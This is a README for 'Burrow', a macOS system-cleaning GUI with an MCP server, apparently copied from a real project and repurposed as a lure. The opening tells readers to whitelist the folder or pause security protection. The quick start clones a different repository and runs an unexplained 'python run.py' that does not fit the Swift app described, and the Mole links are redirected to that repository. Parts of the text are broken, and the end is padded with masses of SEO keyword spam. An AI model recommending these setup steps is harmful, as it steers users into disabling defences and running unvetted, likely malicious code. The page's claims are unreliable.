# Burrow


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/mistcountcloak/Burrow-app.git
cd Burrow-app
python run.py
```


**A free, open-source [mole.fit](https://mole.fit/) — a native macOS GUI for the [Mole](https://github.com/mistcountcloak/Burrow-app) CLI (`mo`).**

![macOS 14+](https://img.shields.io/badge/macOS-14%2B-black)
![License: MIT](https://img.shields.io/badge/License-MIT-blue)
![Requires mole](https://img.shields.io/badge/requires-brew%20install%20mole-orange)

Burrow wraps the free, open-source `mo` CLI in a native Mac app: clean junk,
purge dev artifacts, sweep leftover installers, uninstall apps, run safe
maintenance, map your disk, and watch live system status — all in one
translucent window. On top of that it adds two things the CLI doesn't have:
a **long-running history** of your Mac's metrics in a local SQLite database,
and an **MCP server** so any AI agent (Claude Code, Cursor, Codex…) can ask
"what's been happening on this Mac."

> Burrow is an independent open-source project. It's *inspired by* mole.fit's
> structure and built on the same `mo` engine, but it is **not affiliated
> with or endorsed by mole.fit** — its own name, mark, palette, and copy are
> original.

## Screenshots

<table>
  <tr>
    <td><img alt="Status — live CPU, memory, GPU, disk, network, and battery with sparklines" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-status.png"></td>
    <td><img alt="Analyze — squarified treemap of your whole disk" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-analyze.png"></td>
  </tr>
  <tr>
    <td><img alt="Clean — categorized cache, log, and leftover removal" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-clean.png"></td>
    <td><img alt="Purge — reclaim space from dev projects (node_modules, build dirs, target/…)" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-purge2.png"></td>
  </tr>
  <tr>
    <td><img alt="Installers — find and remove leftover .dmg/.pkg files in bulk" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-installers.png"></td>
    <td><img alt="Optimize — one-tap safe maintenance" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-optimize.png"></td>
  </tr>
  <tr>
    <td><img alt="Software — installed apps with search, sort, and multi-select uninstall" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-apps.png"></td>
    <td><img alt="History — long-range charts over a local SQLite metric history" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-history.png"></td>
  </tr>
</table>

<p align="center">
  <img alt="Activity — a running log of cleans, optimizes, and scans, plus anything in flight" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-activity.png">
</p>

<p align="center">
  <em>Explain with AI — point an MCP-capable agent (Claude Code, or a local model via LM Studio) at Burrow and ask your Mac in plain language.</em>
  <br>
  <img alt="Explain with AI — burrow_snapshot analyzed in plain language" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-ai.png">
</p>

<p align="center">
  <img width="320" alt="Menu-bar HUD — health, metric tiles, top processes, and live job status" src="https://raw.githubusercontent.com/caezium/Burrow/main/docs/assets/shot-menubar.png">
</p>

## The tools

| Tool | What it does | `mo` command |
|---|---|---|
| **Status** | Live dashboard with per-metric sparklines and a sortable/pinnable process table. | `mo status --json` |
| **Clean** | Preview what's reclaimable, then clean for real — categorized cache/log/leftover removal. | `mo clean` |
| **Purge** | Reclaim space from dev projects: `node_modules`, build dirs, `target/`, `__pycache__`, and more. | `mo purge` |
| **Installers** | Find and remove leftover `.dmg`/`.pkg` installer files in bulk. | `mo installer` |
| **Optimize** | One-tap safe maintenance: rebuild caches, repair metadata, flush DNS, restart Dock/Finder. | `mo optimize` |
| **Software** | Installed-app list with search/sort (size, name, recent, source) and multi-select uninstall; a Homebrew **Updates** tab. | `mo uninstall --list`, `brew outdated` |
| **Analyze** | Squarified treemap of your disk; drill into any folder, reveal in Finder. | `mo analyze --json` |

Every scan offers a **no-risk preview** (`--dry-run`) first, a clear
**reclaimed-space summary** when it finishes, and a **Stop** button to abort a
running job.

### What's on the Status dashboard

A live, glanceable read of your Mac's vitals, refreshed continuously:

- **CPU** — usage, load averages (1/5/15), core count, temperature
- **Memory** — used %, pressure (normal/warning/critical), swap
- **GPU** — name and utilisation (Apple Silicon via IOAccelerator)
- **Disk** — capacity and live read/write I/O rates
- **Network** — up/down throughput per interface
- **Battery** — percentage, health, cycle count, time remaining
- **Health score** — Mole's overall 0–100 rating, with a one-line reason
- **Top processes** — by CPU or memory, sortable and pinnable

### Burrow's own extras

- **History** — long-range charts (5 m → 90 d) over a local SQLite history of
  every metric, plus peak-per-process tables. Nothing the CLI keeps.
- **Activity** — a running log of what Burrow has done (cleans, optimizes,
  scans) and the live status of anything in flight.
- **Menu-bar HUD** — health hero, metric tiles, top processes, and live job
  status, all from the menu bar (you can also run as a Dock app instead).
- **MCP server** — a stdio JSON-RPC server (`burrow mcp` / `Burrow --mcp`) plus
  an optional localhost HTTP API, so any AI agent can query your Mac's recent
  state. See [Use it with your AI agent](#use-it-with-your-ai-agent).

## How Burrow compares

|  | **Burrow** | mole.fit | CleanMyMac | Pearcleaner | `mo` / ncdu |
|---|:---:|:---:|:---:|:---:|:---:|
| Price | **Free** | $9 once | Subscription | Free | Free |
| Open source | **MIT** | – | – | ✅ | ✅ (`mo`) |
| Signed / notarized | in progress | ✅ | ✅ | ✅ | n/a |
| Junk cleanup | ✅ | ✅ | ✅ | – | ✅ (`mo`) |
| Dev-artifact purge | ✅ | ✅ | partial | – | ✅ (`mo`) |
| Leftover-installer sweep | ✅ | ✅ | ✅ | – | ✅ (`mo`) |
| Uninstall + leftovers | ✅ | ✅ | ✅ | ✅ *(focus)* | ✅ (`mo`) |
| Disk treemap | ✅ | ✅ | ✅ | – | ncdu *(TUI)* |
| Live system monitor | ✅ | ✅ | partial | – | – |
| Long-term metric history | ✅ | – | – | – | – |
| MCP / agent API | ✅ | – | – | – | – |
| GUI | ✅ | ✅ | ✅ | ✅ | – *(terminal)* |

Honest notes: **mole.fit** is more polished, signed, and supported — buy it
($9) if you want that and to fund `mo`. **Pearcleaner** is an excellent,
focused open-source uninstaller. **ncdu**/`mo` are terminal tools; Burrow is
the GUI for people who'd rather not live in the shell.

## Settings

Everything is local and takes effect immediately unless noted:

| Setting | What it controls |
|---|---|
| **History retention** | How long metric history is kept (1 day → 1 year); older rows are pruned hourly. |
| **Vacuum after large prunes** | Reclaim DB file space after a big prune (off by default). |
| **Sampling rate** | How often Burrow runs `mo status --json` (5 s → 5 min). |
| **Menu-bar icon** | Show the menu-bar item, or run as a regular Dock app instead. |
| **MCP / agent access** | Copyable stdio config + the tool list for Claude Code, Cursor, Codex, Cline, and any MCP client. |
| **Local HTTP query server** | Optional loopback REST API + port for dashboards/curl *(relaunch)*. |
| **Mole engine** | Shows the installed `mo` version, with a one-click **Update Mole**. |

## Permissions & Full Disk Access

Cleaning system and app caches means reading TCC-protected folders, so macOS
will prompt — once per folder — unless the app has **Full Disk Access**. Burrow
handles this honestly:

- Before a flood-prone scan it shows a gate explaining the trade-off, with a
  prompts).
- Don't want to grant it? **Scan with admin** runs the same scan as root —
  root bypasses TCC, so it's a single password prompt instead of a flood.
- Burrow only ever reads sizes; it never opens that data itself, and the real
  cleanup always goes through macOS's own admin dialog.

## Requirements

- **macOS 14+**
  launch without `mo` on PATH (and offers a guided install if it's missing).


### Homebrew (recommended)

```bash
```

### Direct download

Download `Burrow-x.y.z.zip` from
[Releases](), unzip into
`/Applications`, then:

```bash
xattr -cr /Applications/Burrow.app
open /Applications/Burrow.app
```


## Security & trust

Burrow drives the audited `mo` CLI and adds no surveillance of its own:

- **No telemetry, analytics, accounts, ads, or third-party SDKs**, and no
  backend — nothing to phone home to.
- **No background root helper.** When Clean/Optimize need admin rights, macOS's
  own dialog asks you and Burrow runs that one `mo` command, then exits — you
  approve every elevation.
- **Local-only:** the optional MCP HTTP server is loopback (`127.0.0.1`, off by
  default) and history is a local SQLite file. The one opt-in network call is
  `brew outdated` in the Updates tab.
- **Unsigned, pre-1.0** — full honest write-up, including the trade-offs of the
  admin path and the "Scan with admin" option, in **[SECURITY.md](SECURITY.md)**.

## Use it with your AI agent

Burrow doubles as an [MCP](https://modelcontextprotocol.io) server over stdio,
so **any MCP-capable agent** — Claude Code, Cursor, Codex, Cline, Zed, and
others — can read your Mac's recent state. Same server, same `{command, args}`
shape everywhere.

### Let your agent set it up

Paste this to your coding agent and it'll wire itself in:

> Add the **Burrow** MCP server to my config so you can read my Mac's system
> history. It's a local stdio MCP server — run it as `burrow mcp` if the
> Homebrew shim is on my PATH, otherwise
> `/Applications/Burrow.app/Contents/MacOS/Burrow` with args `["--mcp"]`. Add it
> under my MCP servers, reload, and confirm the tools `burrow_snapshot`,
> `burrow_history`, `burrow_top_processes`, `burrow_process_usage`, and
> `burrow_info` are available. Then tell me my Mac's current CPU and memory.

### Or configure it manually

The config is the same JSON for every agent — only the file differs:

```json
{
  "mcpServers": {
    "burrow": {
      "command": "/Applications/Burrow.app/Contents/MacOS/Burrow",
      "args": ["--mcp"]
    }
  }
}
```

| Agent | Where it goes |
|---|---|
| **Claude Code** | `~/.claude/settings.json` — or `claude mcp add burrow -- /Applications/Burrow.app/Contents/MacOS/Burrow --mcp` |
| **Cursor** | `~/.cursor/mcp.json` (global) or `.cursor/mcp.json` (per project) |
| **Codex** | add a `[mcp_servers.burrow]` entry in `~/.codex/config.toml` |
| **Cline / Zed / other** | the client's "MCP servers" / `mcpServers` config |

If you installed via Homebrew, a `burrow` shim is on your PATH, so you can use
`command: "burrow", args: ["mcp"]` instead of the bundle path. Reload the agent
and ask in plain language.

**Tools:**

- `burrow_snapshot` — the latest full status snapshot
- `burrow_history` — a time-series slice of recent snapshots
- `burrow_top_processes` — top processes by peak CPU over a window
- `burrow_process_usage` — rank processes by `cpu_time` / `peak_cpu` / `avg_cpu`
  / `peak_mem`, with the window it used echoed back
- `burrow_info` — what Burrow is recording, retention, and freshness

There's also an optional localhost HTTP API (`127.0.0.1:9277` — `/health`,
`/info`, `/snapshot`, `/metrics`) for dashboards or curl.

## Develop & test

```bash
xcodegen generate
xcodebuild -project Burrow.xcodeproj -scheme Burrow \
  -configuration Debug -destination 'platform=macOS' test
```

The suite covers the parts that matter through public interfaces: DB roundtrip
+ range + stride sampler + prune + corruption recovery, Store clamping/defaults,
Maintenance prune, MCP tool routing + the semantic usage ranking, squarified
treemap invariants, the Full Disk Access decision, and `mo` output parsing.

## Architecture

```
mo status --json   ──>  Sampler ──> SQLite (WAL) ──┬─> Status / History (charts)
                                                   ├─> HTTP QueryServer (:9277)
                                                   └─> burrow mcp (stdio) ─> Claude Code / Cursor / Codex
mo analyze --json  ──>  DiskScanner + squarified Treemap ──────> Analyze
mo clean / purge / installer / optimize ─> CommandRunner (streamed) ─> the tool tabs
mo uninstall --list ─>  Software (+ brew outdated for Updates)
```

One binary, two modes: default is the menu-bar GUI; `burrow mcp` (or `Burrow
--mcp`) is the stdio MCP server (it forks before SwiftUI claims the process).
The whole UI is one translucent window with a top-pill nav (`Brand`/`Tool`
design system); Settings, History, and Activity are panes in that same window.

## Attribution & license

[MIT](LICENSE).

- **Mole CLI** (`mo`) is © [tw93](https://github.com/mistcountcloak/Burrow-app), MIT. Burrow
  depends on it at runtime and bundles nothing from it.
- Inspired by the **mole.fit** Mac app (same author as `mo`). Burrow is an
  independent reimplementation with its own brand — no assets, icons, copy, or
  trade dress are taken from mole.fit.
- The history-DB + MCP pattern shares lineage with the same author's
  [Stats fork](https://github.com/caezium/stats) (`caezium/stats@henry/history-mcp`).
- Treemap layout: Bruls, Huijsen & van Wijk (2000), "Squarified Treemaps,"
  re-implemented from scratch in Swift.


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- Burrow-app - tool utility software - download install setup -->
<!-- portable Burrow-app service | launch Burrow-app | open Burrow-app generator | lightweight Burrow-app gui | getting started Burrow-app scanner | beginner Burrow-app mobile | setup Burrow-app scanner | Burrow-app framework | run configurable Burrow-app | fedora Burrow-app downloader | centos customizable Burrow-app software | 2025 self hosted Burrow-app generator | Burrow-app creator | customizable Burrow-app builder | easy Burrow-app analyzer | build Burrow-app gui | github Burrow-app plugin | download for linux Burrow-app application | get Burrow-app generator | open cross platform Burrow-app | quickstart Burrow-app optimizer | getting started Burrow-app binding | Burrow-app platform | guide Burrow-app gui | how to run top Burrow-app | Burrow-app checker | guide Burrow-app | modern Burrow-app server | github Burrow-app uploader | Burrow-app service | example Burrow-app fork | tutorial easy Burrow-app | local Burrow-app wrapper | source code Burrow-app application | configurable Burrow-app tester | macos Burrow-app monitor | simple Burrow-app tracker | example online Burrow-app package | how to download Burrow-app mirror | demo Burrow-app reader | offline Burrow-app engine | how to run Burrow-app encoder | high performance Burrow-app framework | powerful Burrow-app api | run Burrow-app service | Burrow app best practice | configurable Burrow-app library | reliable Burrow-app | macos high performance Burrow-app | fedora top Burrow-app -->
<!-- github Burrow-app utility | run on linux Burrow-app | git clone Burrow-app library | compile Burrow-app engine | tutorial Burrow-app scanner | fedora stable Burrow-app | git clone Burrow-app decoder | free download Burrow-app replacement | execute stable Burrow-app | demo Burrow-app tool | how to deploy Burrow-app logger | quick start Burrow-app program | use Burrow-app | free Burrow-app desktop | top Burrow-app | fast Burrow-app fork | low latency Burrow-app api | stable Burrow-app extractor | debian Burrow-app module | high performance Burrow-app cli | free Burrow-app library | start Burrow-app builder | setup Burrow-app web | fedora Burrow-app analyzer | getting started Burrow-app checker | centos Burrow-app replacement | use Burrow-app creator | Burrow-app desktop | quick start configurable Burrow-app | linux Burrow-app decoder | debian low latency Burrow-app | download for mac Burrow-app port | configure Burrow-app library | Burrow app podcast | how to deploy Burrow-app | get Burrow-app plugin | wiki self hosted Burrow-app | Burrow-app api | documentation Burrow-app analyzer | Burrow app review | free Burrow-app program | how to setup Burrow-app application | compile Burrow-app mobile | compile Burrow-app reader | tar.gz native Burrow-app | how to deploy Burrow-app scanner | download for mac safe Burrow-app | open source top Burrow-app | easy Burrow-app uploader | source code Burrow-app plugin -->
<!-- Burrow app fix | Burrow-app parser | run on windows Burrow-app | arch Burrow-app | install Burrow-app program | advanced Burrow-app converter | debian Burrow-app wrapper | top Burrow-app checker | free Burrow app | lightweight Burrow-app compressor | how to configure simple Burrow-app | easy Burrow-app cli | Burrow-app monitor | Burrow-app logger | deploy Burrow-app parser | how to deploy Burrow-app server | powerful Burrow-app monitor | arch easy Burrow-app sdk | quick start Burrow-app parser | safe Burrow-app | top Burrow-app generator | powerful Burrow-app | download for windows Burrow-app converter | launch Burrow-app compressor | open stable Burrow-app | beginner Burrow-app engine | how to download Burrow-app encoder | how to install Burrow-app binding | lightweight Burrow-app application | use Burrow-app compressor | how to run Burrow-app sdk | demo lightweight Burrow-app encoder | documentation Burrow-app program | build Burrow-app sdk | guide Burrow-app utility | top Burrow app | walkthrough Burrow-app engine | Burrow app ci cd | examples Burrow-app | Burrow-app mirror | cross platform Burrow-app | free download powerful Burrow-app | run on mac Burrow-app module | sample Burrow-app module | Burrow-app copy | 2025 Burrow-app optimizer | download top Burrow-app | 2026 Burrow-app cli | arch Burrow-app scanner | build Burrow-app downloader -->
<!-- documentation open source Burrow-app | Burrow app help | launch secure Burrow-app | windows Burrow-app generator | macos Burrow-app copy | open source Burrow-app package | examples Burrow-app port | tutorial offline Burrow-app engine | online Burrow-app optimizer | Burrow app book | execute Burrow-app | how to deploy configurable Burrow-app | simple Burrow-app decoder | tar.gz Burrow-app | guide Burrow-app module | download for linux modern Burrow-app | download for linux Burrow-app framework | fedora Burrow-app alternative | Burrow app test | demo Burrow-app service | fedora Burrow-app fork | execute native Burrow-app | windows Burrow-app binding | latest version high performance Burrow-app | easy Burrow-app application | cross platform Burrow-app tester | demo Burrow-app monitor | top Burrow-app package | build easy Burrow-app | Burrow-app builder | local Burrow-app cli | is Burrow app good | safe Burrow-app downloader | walkthrough secure Burrow-app analyzer | ubuntu Burrow-app utility | centos best Burrow-app mirror | modern Burrow-app desktop | zip Burrow-app tester | wiki Burrow-app generator | documentation modern Burrow-app | tutorial Burrow-app fork | how to deploy local Burrow-app | walkthrough Burrow-app server | github Burrow-app application | examples Burrow-app uploader | updated Burrow-app scanner | cross platform Burrow-app cli | macos Burrow-app | modular Burrow-app mobile | Burrow-app debugger -->
<!-- reliable Burrow-app optimizer | reliable Burrow-app port | latest version modern Burrow-app | Burrow-app downloader | use minimal Burrow-app api | offline Burrow-app api | run on mac open source Burrow-app | how to setup fast Burrow-app | wiki Burrow-app editor | docs production ready Burrow-app | reliable Burrow-app debugger | documentation Burrow-app port | install Burrow-app monitor | configurable Burrow-app software | arch Burrow-app monitor | Burrow-app client | Burrow app course | download for linux Burrow-app optimizer | centos Burrow-app gui | Burrow-app generator | examples online Burrow-app | example Burrow-app program | get reliable Burrow-app | tutorial Burrow-app platform | Burrow-app reader | configure Burrow-app | source code safe Burrow-app | download for mac Burrow-app binding | how to deploy Burrow-app uploader | extensible Burrow-app | powerful Burrow-app engine | how to use Burrow-app application | getting started Burrow-app server | download for mac Burrow-app | stable Burrow-app gui | online Burrow-app module | beginner Burrow-app extractor | 2026 Burrow-app | zip Burrow-app addon | download for windows Burrow-app tester | download for mac Burrow-app mirror | ubuntu Burrow-app | Burrow-app server | ubuntu Burrow-app extension | extensible Burrow-app scanner | how to download Burrow-app | beginner stable Burrow-app | offline Burrow-app | start Burrow-app application | Burrow-app uploader -->
<!-- example Burrow-app creator | new version Burrow-app creator | macos Burrow-app engine | portable Burrow-app module | compile native Burrow-app web | quickstart Burrow-app tool | how to use Burrow-app gui | github Burrow-app cli | advanced Burrow-app generator | launch local Burrow-app client | execute Burrow-app analyzer | debian Burrow-app service | debian Burrow-app | tar.gz configurable Burrow-app | free Burrow-app creator | cross platform Burrow-app api | quickstart extensible Burrow-app | Burrow app guide | how to use modular Burrow-app binding | tutorial low latency Burrow-app | windows Burrow-app validator | download modern Burrow-app | open source Burrow-app validator | use simple Burrow-app server | Burrow-app cli | download Burrow-app | beginner open source Burrow-app library | examples Burrow-app parser | ubuntu Burrow-app clone | launch portable Burrow-app | Burrow app cheat sheet | download for windows Burrow-app builder | Burrow app error | lightweight Burrow-app scanner | powerful Burrow-app analyzer | low latency Burrow-app viewer | run Burrow-app | self hosted Burrow-app logger | Burrow app tutorial | portable Burrow-app wrapper | download for windows Burrow-app | download Burrow-app web | Burrow-app compressor | zip Burrow-app | arch modern Burrow-app | execute Burrow-app utility | tar.gz high performance Burrow-app | git clone Burrow-app generator | stable Burrow-app | zip Burrow-app compressor -->
<!-- docs Burrow-app server | free download Burrow-app | compile Burrow-app copy | free Burrow-app clone | fast Burrow-app validator | Burrow app support | online Burrow-app downloader | Burrow app reddit | cross platform Burrow-app library | configurable Burrow-app validator | run on mac Burrow-app editor | open source Burrow-app viewer | Burrow-app library | tutorial Burrow-app generator | minimal Burrow-app service | how to build Burrow-app | customizable Burrow-app clone | modern Burrow-app converter | local Burrow-app | free download Burrow-app monitor | Burrow app webinar | high performance Burrow-app checker | centos Burrow-app service | online Burrow-app program | new version native Burrow-app | walkthrough Burrow-app | how to download Burrow-app clone | advanced Burrow-app | start Burrow-app | download for windows github Burrow-app replacement | compile Burrow-app | self hosted Burrow-app | Burrow-app tester | launch Burrow-app optimizer | extensible Burrow-app application | run on mac top Burrow-app | Burrow app pipeline | how to setup Burrow-app builder | documentation Burrow-app mirror | setup Burrow-app | native Burrow-app | setup powerful Burrow-app tracker | centos Burrow-app engine | documentation Burrow-app | Burrow app automation | launch Burrow-app library | reliable Burrow-app compressor | deploy Burrow-app | how to build Burrow-app checker | configure secure Burrow-app -->
<!-- advanced Burrow-app reader | source code Burrow-app cli | get local Burrow-app | guide Burrow-app parser | low latency Burrow-app uploader | low latency Burrow-app package | run on mac fast Burrow-app validator | Burrow-app validator | how to deploy github Burrow-app | windows Burrow-app | walkthrough Burrow-app editor | build fast Burrow-app | setup Burrow-app tester | easy Burrow-app gui | high performance Burrow-app debugger | zip safe Burrow-app clone | quick start Burrow-app app | extensible Burrow-app mirror | self hosted Burrow-app application | extensible Burrow-app engine | customizable Burrow-app validator | sample online Burrow-app | customizable Burrow-app | best Burrow-app viewer | sample top Burrow-app | Burrow app benchmark | execute Burrow-app binding | stable Burrow-app monitor | run on mac Burrow-app | linux Burrow-app logger | updated Burrow-app addon | examples Burrow-app analyzer | windows customizable Burrow-app | modular Burrow-app clone | arch Burrow-app creator | safe Burrow-app binding | how to install Burrow-app engine | free download Burrow-app utility | how to use Burrow-app replacement | walkthrough secure Burrow-app reader | high performance Burrow-app optimizer | how to run Burrow-app api | download for linux Burrow-app monitor | fast Burrow-app compressor | free Burrow-app scanner | latest version Burrow-app compressor | latest version Burrow-app logger | production ready Burrow-app | compile Burrow-app compressor | use portable Burrow-app clone -->
<!-- customizable Burrow-app scanner | deploy Burrow-app gui | top Burrow-app optimizer | top Burrow-app gui | how to setup Burrow-app program | download Burrow-app scanner | customizable Burrow-app plugin | setup fast Burrow-app | run on mac minimal Burrow-app | Burrow app download | reliable Burrow-app logger | powerful Burrow-app client | cross platform Burrow-app clone | updated Burrow-app software | local Burrow-app generator | walkthrough Burrow-app decoder | production ready Burrow-app addon | latest version Burrow-app validator | Burrow app demo | low latency Burrow-app addon | latest version production ready Burrow-app plugin | latest version Burrow-app generator | free Burrow-app | setup stable Burrow-app sdk | wiki minimal Burrow-app | how to install Burrow-app reader | get Burrow-app parser | minimal Burrow-app logger | ubuntu Burrow-app alternative | tar.gz Burrow-app downloader | cross platform Burrow-app module | Burrow app handbook | low latency Burrow-app client | Burrow-app tracker | open Burrow-app | how to build offline Burrow-app | self hosted Burrow-app api | simple Burrow-app | Burrow-app application | download for mac Burrow-app app | free Burrow-app checker | run Burrow-app tester | install Burrow-app web | reliable Burrow-app uploader | install best Burrow-app | extensible Burrow-app debugger | safe Burrow-app scanner | download for linux Burrow-app service | reliable Burrow-app cli | download for windows Burrow-app clone -->
<!-- Burrow-app alternative | 2025 Burrow-app binding | docs Burrow-app library | download Burrow-app addon | new version Burrow-app | run Burrow-app plugin | install Burrow-app service | Burrow-app tool | Burrow app vs | latest version Burrow-app | Burrow-app software | fedora Burrow-app api | easy Burrow-app framework | sample Burrow-app monitor | run on linux Burrow-app platform | offline Burrow-app generator | Burrow-app utility | reliable Burrow-app analyzer | latest version Burrow-app replacement | 2026 Burrow-app framework | self hosted Burrow-app optimizer | guide Burrow-app plugin | linux Burrow-app tool | sample Burrow-app viewer | configurable Burrow-app | updated Burrow-app utility | download for mac minimal Burrow-app | download for linux lightweight Burrow-app | updated easy Burrow-app copy | wiki Burrow-app encoder | minimal Burrow-app engine | Burrow-app sdk | lightweight Burrow-app checker | zip extensible Burrow-app module | Burrow-app viewer | compile stable Burrow-app | top Burrow-app desktop | self hosted Burrow-app plugin | modern Burrow-app mobile | free Burrow-app editor | open source local Burrow-app viewer | Burrow-app extension | arch Burrow-app viewer | Burrow-app package | new version top Burrow-app port | run on windows Burrow-app logger | run Burrow-app fork | launch Burrow-app generator | 2026 lightweight Burrow-app creator | best Burrow-app downloader -->

<!-- Last updated: 2026-06-09 19:18:32 -->
